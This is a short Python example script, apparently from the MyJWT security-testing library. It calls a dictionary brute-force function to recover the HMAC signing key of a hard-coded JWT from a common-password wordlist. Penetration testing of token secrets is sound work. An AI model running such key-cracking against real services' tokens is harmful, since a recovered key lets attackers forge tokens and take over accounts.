from MyJWT.utils import jwtToJson
from MyJWT.vulnerabilities import bruteforceDict

jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"
wordlist = "../../wordlist/common_pass.txt"

key = bruteforceDict(jwt, wordlist)
print(key)
